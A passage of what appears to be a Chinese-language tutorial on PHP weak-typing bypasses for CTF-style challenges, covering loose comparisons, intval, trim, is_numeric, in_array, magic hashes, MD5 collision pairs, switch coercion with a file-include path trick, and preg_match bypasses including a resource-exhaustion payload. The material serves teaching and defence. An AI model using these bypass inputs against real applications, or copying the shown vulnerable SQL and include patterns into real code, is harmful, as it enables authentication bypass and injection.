4.3.0 - 5.2.0</span></span><br><span class="line"><span class="string">&#x27;608E-4234&#x27;</span> == <span class="string">&#x27;272E-3063&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># true in PHP 4.3.0 - 5.6.x</span></span><br><span class="line"><span class="comment"># false in 7.0.0+</span></span><br><span class="line"><span class="string">&#x27;0e0&#x27;</span> == <span class="string">&#x27;0x0&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xABC&#x27;</span> == <span class="string">&#x27;0xabc&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xABCdef&#x27;</span> == <span class="string">&#x27;0xabcDEF&#x27;</span></span><br><span class="line"><span class="string">&#x27;000000e1&#x27;</span> == <span class="string">&#x27;0x000000&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xABFe1&#x27;</span> == <span class="string">&#x27;0xABFE1&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xe&#x27;</span> == <span class="string">&#x27;0Xe&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xABCDEF&#x27;</span> == <span class="string">&#x27;11259375&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xABCDEF123&#x27;</span> == <span class="string">&#x27;46118400291&#x27;</span></span><br><span class="line"><span class="string">&#x27;0x1234AB&#x27;</span> == <span class="string">&#x27;1193131&#x27;</span></span><br><span class="line"><span class="string">&#x27;0x1234Ab&#x27;</span> == <span class="string">&#x27;1193131&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># true in PHP 4.3.0 - 4.3.9, 5.2.1 - 5.6.x</span></span><br><span class="line"><span class="comment"># false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0, 7.0.0+</span></span><br><span class="line"><span class="string">&#x27;0xABCdef&#x27;</span> == <span class="string">&#x27; 0xabcDEF&#x27;</span></span><br><span class="line"><span class="string">&#x27;1e1&#x27;</span> == <span class="string">&#x27;0xa&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xe&#x27;</span> == <span class="string">&#x27; 0Xe&#x27;</span></span><br><span class="line"><span class="string">&#x27;0x123&#x27;</span> == <span class="string">&#x27; 0x123&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># true in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0</span></span><br><span class="line"><span class="comment"># false in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2, 5.2.1 - 5.6.26, 7.0.0+</span></span><br><span class="line"><span class="string">&#x27;0e0&#x27;</span> == <span class="string">&#x27;0x0a&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># true in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2</span></span><br><span class="line"><span class="comment"># false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.6.26, 7.0.0+</span></span><br><span class="line"><span class="string">&#x27;0xe&#x27;</span> == <span class="string">&#x27; 0Xe.&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>intval() 在转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval() 不会报错而是返回 0。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(intval(<span class="string">&#x27;2&#x27;</span>)) <span class="comment">// 2</span></span><br><span class="line">var_dump(intval(<span class="string">&#x27;3abcd&#x27;</span>)) <span class="comment">// 3</span></span><br><span class="line">var_dump(intval(<span class="string">&#x27;abcd&#x27;</span>)) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="number">0</span> == <span class="string">&#x27;0&#x27;</span>); <span class="comment">// true</span></span><br><span class="line">var_dump(<span class="number">0</span> == <span class="string">&#x27;abcdefg&#x27;</span>); <span class="comment">// true </span></span><br><span class="line">var_dump(<span class="number">0</span> === <span class="string">&#x27;abcdefg&#x27;</span>); <span class="comment">// false</span></span><br><span class="line">var_dump(<span class="number">1</span> == <span class="string">&#x27;1abcdef&#x27;</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(intval(<span class="variable">$a</span>) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">    mysql_query(<span class="string">&quot;select * from news where id=&quot;</span>.<span class="variable">$a</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h2><p>trim 函数会过滤空格以及 \n\r\t\v\0，但不会过滤过滤\f</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;  \n\r\t\v\0abc  \f&quot;</span>;</span><br><span class="line">var_dump(trim(<span class="variable">$a</span>)); <span class="comment">// abc  \f</span></span><br></pre></td></tr></table></figure>

<p>利用 trim 及 is_numeric 等函数实现的绕过    </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// %0c1%00</span></span><br><span class="line">    <span class="variable">$number</span> = <span class="string">&quot;\f1\0&quot;</span>;</span><br><span class="line">    <span class="comment">// trim 函数会过滤 \n\r\t\v\0，但不会过滤过滤\f</span></span><br><span class="line">    <span class="variable">$number_2</span> = trim(<span class="variable">$number</span>);</span><br><span class="line">    var_dump(<span class="variable">$number_2</span>); <span class="comment">// \f1</span></span><br><span class="line">    <span class="variable">$number_2</span> = addslashes(<span class="variable">$number_2</span>);</span><br><span class="line">    var_dump(<span class="variable">$number_2</span>);  <span class="comment">// \f1</span></span><br><span class="line">    <span class="comment">// is_numeric 检测的时候会过滤掉 &#x27;&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\r&#x27;, &#x27;\v&#x27;, &#x27;\f&#x27; 等字符</span></span><br><span class="line">    <span class="comment">// 但是不会过滤 &#x27;\0&#x27;</span></span><br><span class="line">    var_dump(is_numeric(<span class="variable">$number</span>)); <span class="comment">// false</span></span><br><span class="line">    var_dump(strval(intval(<span class="variable">$number_2</span>))); <span class="comment">// 1</span></span><br><span class="line">    var_dump(<span class="string">&quot;\f1&quot;</span> == <span class="string">&quot;1&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="number">233333</span>);       <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">&#x27;233333&#x27;</span>);    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="number">0x233333</span>);    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">&#x27;0x233333&#x27;</span>);    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">&#x27;9e9&#x27;</span>);   <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">&#x27;233333abc&#x27;</span>);  <span class="comment">// 0</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>is_numeric 检测的时候会自动过滤掉前面的 ‘ ‘, ‘\t’, ‘\n’, ‘\r’, ‘\v’, ‘\f’ 等字符，但是不会过滤 ‘\0’，如果这些字符出现在字符串尾，也不会过滤，二是返回 false</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(is_numeric(<span class="string">&quot;\01&quot;</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot; 1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;\t1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;\n1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;\r1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;\v1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;\f1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;\f\f1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;1\f&quot;</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<h2 id="数组与字符串"><a href="#数组与字符串" class="headerlink" title="数组与字符串"></a>数组与字符串</h2><p>当 $var 是一个字符串的时候，访问 $var[“any string”] 跟访问 $var[intval(“any string”)] 效果是一样的。如果有变量覆盖，可以实现一些绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$userinfo</span> = <span class="string">&#x27;abcdefg&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$userinfo</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="number">123</span>;</span><br><span class="line"><span class="comment">// 这里等价于 $var[0] = 1，$userinfo[&#x27;id&#x27;] = 1</span></span><br><span class="line"><span class="variable">$userinfo</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userinfo</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;***&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array"></a>in_array</h2><p>in_array函数用来判断一个值是否在某一个数组列表里面，通常判断方式如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">in_array(<span class="string">&#x27;b&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>这段代码的作用是过滤 GET 参数 typeid 在不在 1，2，3，4 这个数组里面。但是，in_array 函数存在自动类型转换。如果请求，typeid=1’ union select.. 也能通过 in_array 的验证</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$_GET</span>(<span class="string">&#x27;typeid&#x27;</span>], <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>))) &#123;</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;select …. where typeid=&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;typeid&#x27;</span>]<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    echo <span class="subst">$sql</span>;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="和"><a href="#和" class="headerlink" title="== 和 ==="></a>== 和 ===</h2><ul>
<li> == 是弱类型的比较</li>
<li>=== 比较符则可以避免这种隐式转换，除了检查值还检查类型。</li>
</ul>
<p>以下比较的结果都为 true</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc</span></span><br><span class="line"><span class="comment">// 十六进制与整数，被转换为同一进制比较</span></span><br><span class="line"><span class="string">&#x27;0xccccccccc&#x27;</span> == <span class="string">&#x27;54975581388&#x27;</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">// 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0</span></span><br><span class="line"><span class="number">1</span> == <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="number">1</span> == <span class="string">&#x27;01&#x27;</span></span><br><span class="line"><span class="number">10</span> == <span class="string">&#x27;1e1&#x27;</span></span><br><span class="line"><span class="number">100</span> == <span class="string">&#x27;1e2&#x27;</span> </span><br><span class="line"><span class="number">0</span> == <span class="string">&#x27;a&#x27;</span> <span class="comment">// a 转换为数字为 0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 十六进制数与带空格十六进制数，被转换为十六进制整数</span></span><br><span class="line"><span class="string">&#x27;0xABCdef&#x27;</span> == <span class="string">&#x27;     0xABCdef&#x27;</span></span><br><span class="line"><span class="string">&#x27;0010e2&#x27;</span> == <span class="string">&#x27;1e3&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="magic-hash"><a href="#magic-hash" class="headerlink" title="magic hash"></a>magic hash</h2><p>md5</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0e 开头，后面全是数字的</span></span><br><span class="line"><span class="number">240610708</span>: <span class="number">0e462097431906509019562988736854</span></span><br><span class="line">QLTHNDT: <span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO: <span class="number">0e830400451993494058024219903391</span></span><br><span class="line">PJNPDWY: <span class="number">0e291529052894702774557631701704</span></span><br><span class="line">NWWKITQ: <span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF: <span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MMHUWUV: <span class="number">0e701732711630150438129209816536</span></span><br><span class="line">MAUXXQC: <span class="number">0e478478466848439040434801845361</span></span><br><span class="line">IHKFRNS: <span class="number">0e256160682445802696926137988570</span></span><br><span class="line">GZECLQZ: <span class="number">0e537612333747236407713628225676</span></span><br><span class="line">GGHMVOE: <span class="number">0e362766013028313274586933780773</span></span><br><span class="line">GEGHBXL: <span class="number">0e248776895502908863709684713578</span></span><br><span class="line">EEIZDOI: <span class="number">0e782601363539291779881938479162</span></span><br><span class="line">DYAXWCA: <span class="number">0e424759758842488633464374063001</span></span><br><span class="line">DQWRASX: <span class="number">0e742373665639232907775599582643</span></span><br><span class="line">BRTKUJZ: <span class="number">00e57640477961333848717747276704</span></span><br><span class="line">ABJIHVY: <span class="number">0e755264355178451322893275696586</span></span><br><span class="line">aaaXXAYW: <span class="number">0e540853622400160407992788832284</span></span><br><span class="line">aabg7XSs: <span class="number">0e087386482136013740957780965295</span></span><br><span class="line">aabC9RqS: <span class="number">0e041022518165728065344349536299</span></span><br></pre></td></tr></table></figure>

<p>sha1</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">10932435112</span>: <span class="number">0e07766915004133176347055865026311692244</span></span><br><span class="line">aaroZmOk: <span class="number">0e66507019969427134894567494305185566735</span></span><br><span class="line">aaK1STfY: <span class="number">0e76658526655756207688271159624026011393</span></span><br><span class="line">aaO8zKZF: <span class="number">0e89257456677279068558073954252716165668</span></span><br><span class="line">aa3OFF9m: <span class="number">0e36977786278517984959260394024281014729</span></span><br></pre></td></tr></table></figure>

<p>crc32</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">6586</span>: <span class="number">0e817678</span></span><br></pre></td></tr></table></figure>

<p>两个 md5 一样的字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii import unhexlify</span><br><span class="line"><span class="keyword">from</span> hashlib import md5</span><br><span class="line"><span class="keyword">from</span> future.moves.urllib.parse import quote</span><br><span class="line"></span><br><span class="line">input1 = <span class="string">&#x27;Oded Goldreich\nOded Goldreich\nOded Goldreich\nOded Go&#x27;</span> + unhexlify(</span><br><span class="line"><span class="string">&#x27;d8050d0019bb9318924caa96dce35cb835b349e144e98c50c22cf461244a4064bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf67c12978647f5af123de3acf844085cd025b956&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(quote(input1))</span><br><span class="line"><span class="keyword">print</span> md5(input1).hexdigest()</span><br><span class="line"></span><br><span class="line">input2 = <span class="string">&#x27;Neal Koblitz\nNeal Koblitz\nNeal Koblitz\nNeal Koblitz\n&#x27;</span> + unhexlify(<span class="string">&#x27;75b80e0035f3d2c909af1baddce35cb835b349e144e88c50c22cf461244a40e4bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf6fc11978647f5af123de3acf84408dcd025b956&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> md5(input2).hexdigest()</span><br><span class="line"><span class="keyword">print</span>(quote(input2))</span><br></pre></td></tr></table></figure>

<p>另外一组 md5 一样的字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">input1 = array(<span class="string">&#x27;I&#x27;</span>, [<span class="number">0x6165300e</span>,<span class="number">0x87a79a55</span>,<span class="number">0xf7c60bd0</span>,<span class="number">0x34febd0b</span>,<span class="number">0x6503cf04</span>,<span class="number">0x854f709e</span>,<span class="number">0xfb0fc034</span>,<span class="number">0x874c9c65</span>,<span class="number">0x2f94cc40</span>,<span class="number">0x15a12deb</span>,<span class="number">0x5c15f4a3</span>,<span class="number">0x490786bb</span>,<span class="number">0x6d658673</span>,<span class="number">0xa4341f7d</span>,<span class="number">0x8fd75920</span>,<span class="number">0xefd18d5a</span>])</span><br><span class="line">input2 = array(<span class="string">&#x27;I&#x27;</span>, [x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(input1, [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])])</span><br><span class="line"><span class="built_in">print</span>(input1 == input2) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(md5(input1).hexdigest()) <span class="comment"># cee9a457e790cf20d4bdaa6d69f01e41</span></span><br><span class="line"><span class="built_in">print</span>(md5(input2).hexdigest()) <span class="comment"># cee9a457e790cf20d4bdaa6d69f01e41</span></span><br></pre></td></tr></table></figure>

<p>magic hash</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md2 <span class="number">32</span>  <span class="number">505144726</span>   <span class="number">0e015339760548602306096794382326</span>    WhiteHat Security, Inc.</span><br><span class="line">md4 <span class="number">32</span>  <span class="number">48291204</span>    <span class="number">0e266546927425668450445617970135</span>    WhiteHat Security, Inc.</span><br><span class="line">md5 <span class="number">32</span>  <span class="number">240610708</span>   <span class="number">0e462097431906509019562988736854</span>    Michal Spacek</span><br><span class="line">sha1    <span class="number">40</span>  <span class="number">10932435112</span> <span class="number">0e07766915004133176347055865026311692244</span>    Independently found by Michael A. Cleverly &amp; Michele Spagnuolo &amp; Rogdham</span><br><span class="line">sha224  <span class="number">56</span>  –   –   –</span><br><span class="line">sha256  <span class="number">64</span>  –   –   –</span><br><span class="line">sha384  <span class="number">96</span>  –   –   –</span><br><span class="line">sha512  <span class="number">128</span> –   –   –</span><br><span class="line">ripemd128   <span class="number">32</span>  <span class="number">315655854</span>   <span class="number">0e251331818775808475952406672980</span>    WhiteHat Security, Inc.</span><br><span class="line">ripemd160   <span class="number">40</span>  <span class="number">20583002034</span> <span class="number">00e1839085851394356611454660337505469745</span>    Michael A Cleverly</span><br><span class="line">ripemd256   <span class="number">64</span>  –   –   –</span><br><span class="line">ripemd320   <span class="number">80</span>  –   –   –</span><br><span class="line">whirlpool   <span class="number">128</span> –   –   –</span><br><span class="line">tiger128,<span class="number">3</span>  <span class="number">32</span>  <span class="number">265022640</span>   <span class="number">0e908730200858058999593322639865</span>    WhiteHat Security, Inc.</span><br><span class="line">tiger160,<span class="number">3</span>  <span class="number">40</span>  <span class="number">13181623570</span> <span class="number">00e4706040169225543861400227305532507173</span>    Michele Spagnuolo</span><br><span class="line">tiger192,<span class="number">3</span>  <span class="number">48</span>  –   –   –</span><br><span class="line">tiger128,<span class="number">4</span>  <span class="number">32</span>  <span class="number">479763000</span>   <span class="number">00e05651056780370631793326323796</span>    WhiteHat Security, Inc.</span><br><span class="line">tiger160,<span class="number">4</span>  <span class="number">40</span>  <span class="number">62241955574</span> <span class="number">0e69173478833895223726165786906905141502</span>    Michele Spagnuolo</span><br><span class="line">tiger192,<span class="number">4</span>  <span class="number">48</span>  –   –   –</span><br><span class="line">snefru  <span class="number">64</span>  –   –   –</span><br><span class="line">snefru256   <span class="number">64</span>  –   –   –</span><br><span class="line">gost    <span class="number">64</span>  –   –   –</span><br><span class="line">adler32 <span class="number">8</span>   FR  <span class="number">00e00099</span>    WhiteHat Security, Inc.</span><br><span class="line">crc32   <span class="number">8</span>   <span class="number">2332</span>    <span class="number">0e684322</span>    WhiteHat Security, Inc.</span><br><span class="line">crc32b  <span class="number">8</span>   <span class="number">6586</span>    <span class="number">0e817678</span>    WhiteHat Security, Inc.</span><br><span class="line">fnv132  <span class="number">8</span>   <span class="number">2186</span>    <span class="number">0e591528</span>    WhiteHat Security, Inc.</span><br><span class="line">fnv164  <span class="number">16</span>  <span class="number">8338000</span> <span class="number">0e73845709713699</span>    WhiteHat Security, Inc.</span><br><span class="line">joaat   <span class="number">8</span>   <span class="number">8409</span>    <span class="number">0e074025</span>    WhiteHat Security, Inc.</span><br><span class="line">haval128,<span class="number">3</span>  <span class="number">32</span>  <span class="number">809793630</span>   <span class="number">00e38549671092424173928143648452</span>    WhiteHat Security, Inc.</span><br><span class="line">haval160,<span class="number">3</span>  <span class="number">40</span>  <span class="number">18159983163</span> <span class="number">0e01697014920826425936632356870426876167</span>    Independently found by Michael Cleverly &amp; Michele Spagnuolo</span><br><span class="line">haval192,<span class="number">3</span>  <span class="number">48</span>  <span class="number">48892056947</span> <span class="number">0e4868841162506296635201967091461310754872302741</span>    Michael A. Cleverly</span><br><span class="line">haval224,<span class="number">3</span>  <span class="number">56</span>  –   –   –</span><br><span class="line">haval256,<span class="number">3</span>  <span class="number">64</span>  –   –   –</span><br><span class="line">haval128,<span class="number">4</span>  <span class="number">32</span>  <span class="number">71437579</span>    <span class="number">0e316321729023182394301371028665</span>    WhiteHat Security, Inc.</span><br><span class="line">haval160,<span class="number">4</span>  <span class="number">40</span>  <span class="number">12368878794</span> <span class="number">0e34042599806027333661050958199580964722</span>    Michele Spagnuolo</span><br><span class="line">haval192,<span class="number">4</span>  <span class="number">48</span>  –   –   –</span><br><span class="line">haval224,<span class="number">4</span>  <span class="number">56</span>  –   –   –</span><br><span class="line">haval256,<span class="number">4</span>  <span class="number">64</span>  –   –   –</span><br><span class="line">haval128,<span class="number">5</span>  <span class="number">32</span>  <span class="number">115528287</span>   <span class="number">0e495317064156922585933029613272</span>    WhiteHat Security, Inc.</span><br><span class="line">haval160,<span class="number">5</span>  <span class="number">40</span>  <span class="number">33902688231</span> <span class="number">00e2521569708250889666329543741175098562</span>    Michele Spagnuolo</span><br><span class="line">haval192,<span class="number">5</span>  <span class="number">48</span>  <span class="number">52888640556</span> <span class="number">0e9108479697641294204710754930487725109982883677</span>    Michele Spagnuolo</span><br><span class="line">haval224,<span class="number">5</span>  <span class="number">56</span>  –   –   –</span><br><span class="line">haval256,<span class="number">5</span>  <span class="number">64</span>  –   –   –</span><br></pre></td></tr></table></figure>

<h2 id="hash-比较的问题"><a href="#hash-比较的问题" class="headerlink" title="hash 比较的问题"></a>hash 比较的问题</h2><p>0e 开头且后面都是数字会被当作科学计数法，也就是等于 0*10^xxx=0。如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// <span class="string">&#x27;0e5093234&#x27;</span> 为 <span class="number">0</span>，<span class="string">&#x27;0eabc3234&#x27;</span> 不为 <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">// true</span><br><span class="line"><span class="string">&#x27;0e509367213418206700842008763514&#x27;</span> == <span class="string">&#x27;0e481036490867661113260034900752&#x27;</span></span><br><span class="line">// true</span><br><span class="line"><span class="string">&#x27;0e481036490867661113260034900752&#x27;</span> == <span class="string">&#x27;0&#x27;</span> </span><br><span class="line"> </span><br><span class="line">// false</span><br><span class="line">var_dump(<span class="string">&#x27;0&#x27;</span> == <span class="string">&#x27;0e1abcd&#x27;</span>);</span><br><span class="line">// true</span><br><span class="line">var_dump(<span class="number">0</span> == <span class="string">&#x27;0e1abcd&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">var_dump(md5(<span class="string">&#x27;240610708&#x27;</span>) == md5(<span class="string">&#x27;QNKCDZO&#x27;</span>));</span><br><span class="line">var_dump(md5(<span class="string">&#x27;aabg7XSs&#x27;</span>) == md5(<span class="string">&#x27;aabC9RqS&#x27;</span>));</span><br><span class="line">var_dump(sha1(<span class="string">&#x27;aaroZmOk&#x27;</span>) == sha1(<span class="string">&#x27;aaK1STfY&#x27;</span>));</span><br><span class="line">var_dump(sha1(<span class="string">&#x27;aaO8zKZF&#x27;</span>) == sha1(<span class="string">&#x27;aa3OFF9m&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>如果要找出 0e 开头的 hash 碰撞，可以用如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$salt</span> = <span class="string">&#x27;vunp&#x27;</span>;</span><br><span class="line"><span class="variable">$hash</span> = <span class="string">&#x27;0e612198634316944013585621061115&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="number">100000000000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$salt</span> . <span class="variable">$i</span>) == <span class="variable">$hash</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;  done&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h1 id="5-switch"><a href="#5-switch" class="headerlink" title="5.  switch"></a>5.  switch</h1><p>如果 switch 是数字类型的 case 的判断时， switch 会将其中的参数转换为 int类型。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> =<span class="string">&quot;2abc&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$i</span>)  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i is less than 3 but not negative&quot;</span>;</span><br><span class="line">        <span class="comment">// 如果$i = 2/../flag_is_here，则通过这种方式可以包含 flag_is_here.php 文件</span></span><br><span class="line">        <span class="keyword">require_once</span> <span class="variable">$i</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i is 3&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个时候程序输出的是 i is less than 3 but not negative，是由于 switch() 函数将 $i 进行了类型转换，转换结果为 2。</p>
<h1 id="6-正则表达式"><a href="#6-正则表达式" class="headerlink" title="6. 正则表达式"></a>6. 正则表达式</h1><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><p>preg_match 函数用于进行正则表达式匹配，返回 pattern 的匹配次数，它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后将会停止搜索。如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;1.1.1.1 abcd&#x27;</span>; <span class="comment">// 可以绕过</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;</span>,<span class="variable">$ip</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// echo(&#x27;key...&#x27;)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pre_match 在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，如果传入一个超长的字符串，会导致 pre_match 消耗大量资源从而导致 php 超时，后面的 php 语句就不会执行。payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$code</span>=<span class="string">&quot;xdsec###AAAAAAAAAAAAAAAAAAA(超多个A)&quot;</span>;</span><br><span class="line">preg_match(<span class="string">&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;</span>, <span class="variable">$code</span>));</span><br></pre></td></tr></table></figure>

<p>就是匹配文件名由字母、数字、下划线、破则号、斜杠、空白字符各种组合的并且后缀名是rpt的文件，如果匹配成功，就执行系统命令file打印文件的类型和编码信息，如果匹配失败就打印’regex failed’.</p>
